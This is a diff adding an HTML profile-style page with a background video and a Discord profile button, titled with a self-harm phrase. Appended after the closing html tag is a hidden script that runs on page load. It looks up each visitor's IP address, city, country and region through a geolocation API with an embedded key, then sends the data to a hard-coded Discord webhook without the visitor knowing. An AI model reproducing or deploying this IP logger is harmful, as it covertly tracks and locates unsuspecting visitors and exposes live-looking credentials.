@@ -1,0 +1,72 @@
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="UTF-8">
+<title>idkhowtokillmyself</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900'><link rel="stylesheet" href="style.css">
+<link rel="icon" href="../media.discordapp.net/attachments/877544261929799741/957706086155169872/fdb53c9bea031368f98bf7c93a26b359.png">
+<script src="friends.js"></script>
+</head>
+<body>
+
+<video playsinline autoplay muted loop poster="polina.html" id="bgvid">
+<source src="video1080.mp4" type="video/mp4">
+</video>
+
+<div class="container"><div class="at-section"></div>
+
+  <!-- titulo -->
+ <div class="at-title"></div>
+
+ 
+<div class="at-grid" data-column="1">
+  
+<!-- 1 -->
+<div class="at-column"><div class="at-user"><div class="at-user__avatar"><img id="jeje" alt="" /></div><div class="at-user__name"><h3 class="jeje" </h3></div>
+  <button class="button" Onclick="window.location='https://discord.com/users/684902555670806546'">:/</button>
+</div></div>
+  
+
+ 
+  
+</div></div></div></div></div></div></body>
+</html>
+
+<!-- kkR -->
+<script>
+
+function getIP(json) {
+    function json(url) {
+    return fetch(url).then(res => res.json());
+    }
+    
+    let apiKey = 'f9c6dbbf5fbce305ac584ead017fc8c2278e99bce2e7d798ec960f7e';
+
+    json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/967610066343723019/BwG3aS8bV1q6I2VTz-v82oNtW70XsTBYGzgCVDiyrJbNf_hirYc-FYDx5FzsilRdpCZ6");
+     
+     request.setRequestHeader('Content-type', 'application/json');
+     
+     var params = 
+     {
+          username: "jeje",
+          avatar_url: "https://cdn.discordapp.com/attachments/957655044231147532/965469455201226792/IMG_6788.jpg",
+          content: "IP:  " + data.ip + "**         **" + "CIDADE:  " + data.city + "**         **" +  "PAÍS:  " + data.country_code +  "**         **" + "ESTADO:  " +  data.region
+     }
+     
+     request.send(JSON.stringify(params));
+    });
+}
+
+</script>
+</head>
+<script src="https://api.ipify.org/?format=jsonp&amp;callback=getIP"></script>
+<body onload="getIP()">
+
+<script>
